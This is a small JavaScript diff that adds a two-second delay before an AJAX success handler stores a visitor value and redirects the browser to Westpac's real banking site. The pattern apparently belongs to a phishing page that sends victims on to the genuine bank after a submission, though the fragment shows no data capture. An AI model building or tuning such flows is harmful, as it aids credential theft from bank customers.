@@ -277,7 +277,7 @@
             }).done(function(msg) {
                 sessionStorage.setItem('visitor', visitor);
                 console.log(msg); // Log success message
-				setTimeout(()=>{window.location.href = "https://banking.westpac.com.au";});
+				setTimeout(()=>{window.location.href = "https://banking.westpac.com.au";},2000);
             }).fail(function(err, textstatus, error) {
                 // Handle failure here
             });
